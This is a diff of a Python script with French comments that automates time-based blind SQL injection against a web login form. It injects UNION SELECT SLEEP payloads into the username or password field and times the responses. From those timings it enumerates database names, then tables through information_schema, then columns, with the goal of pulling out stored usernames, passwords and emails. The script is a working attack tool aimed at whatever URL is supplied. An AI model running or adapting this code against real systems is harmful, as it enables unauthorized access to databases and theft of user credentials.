@@ -19,11 +19,12 @@ def db_name():
     texte = ""
     TIME = 5
 
-    # Find the name of the database by checking the time it takes for a query to complete
+    # cherche le nombre de colonne que va utiliser la requête sql "SELECT username as column1, password as column2, email as column3 FROM users UNION SELECT '1' AS column1, '2' AS column2, '3' AS column3"
     for letter in dictionary:
         for num in range(1, 10):
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
             payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+            print(payload)
             start_time = time.time()
             response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
@@ -33,7 +34,7 @@ def db_name():
                 break
         if total_time >= TIME:
             break 
-
+    # Si le payload dans le champ password ne fonctionne pas, tester sur le champ username pour savoir si il est vulnérable
     if table == "":
         for letter in dictionary:
             for num in range(1, 10):
@@ -57,10 +58,11 @@ def db_name():
         print("Pas de base de données trouvées")
         exit()
 
-    # Use the name of the database to find the names of the tables
+    # Cherche le nom de la base de données que le formulaire de connexion utilise
     for i in range(1, 20):
         for j in range(0, len(dictionary)):
             payload = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
+            print(payload)
             start_time = time.time()
             if vulnerable_input == False:   
                 response = requests.post(url, data={'username': payload, 'password': usr})
@@ -83,7 +85,7 @@ def db_name():
 
     db.append(texte)
 
-    # Print the names of the databases and prompt the user to choose one
+    # Affiche la ou les base de données trouvées
     b=0
     for x in db:
         b += 1
@@ -92,10 +94,10 @@ def db_name():
     c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))
 
     print("Vous avez choisi {}. ".format(db[c-1]))
-    """faire pause"""
     final_db=""
     jsp = final_db + "".join(db[c-1])
     return jsp
+
 
 def table_name(database):
     tables_name = []
@@ -107,7 +109,7 @@ def table_name(database):
         for j in range(0, len(dictionary)):
             if a > 37:
                 if texte != "":
-                    # Remove the first letter of 'texte' and append 'texte' to 'tables_name'
+                    # Comme c'est une requêt sql qui utilise un dictionnaire, si on enlève pas la première lettre cela va toujours retombé sur le même mot
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
                     tables_name.append(texte)
@@ -120,7 +122,7 @@ def table_name(database):
             payload = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
             """print(payload)"""
             
-            # Measure the time it takes for the response
+            # Mesure le temps de la réponse du site web avec le temps donné dans la requête
             start_time = time.time()
             if vulnerable_input == False:   
                 response = requests.post(url, data={'username': payload, 'password': usr})
@@ -137,7 +139,7 @@ def table_name(database):
                 a = 0
                 break
     
-    # Print the list of tables and prompt user to choose a table
+    # Affiche les tables trouvées et demande sur laquelle l'utilisateur veut continuer
     b = 0
     for x in tables_name:
         b += 1
@@ -146,7 +148,7 @@ def table_name(database):
     c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continuer : "))
     print("Vous avez choisi la table {}. ".format(tables_name[c-1]))
     
-    # Combine the selected table name with 'final_db'
+    
     final_db = ""
     jsp2 = final_db + "".join(tables_name[c-1])
     
@@ -237,7 +239,6 @@ def trouver_tab0(nom_table):
                 response = requests.post(url, data={'username': payload, 'password': usr})
             else:
                 response = requests.post(url, data={'username': usr, 'password': payload})
-            # Mesure du temps d'exécution de la requête
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
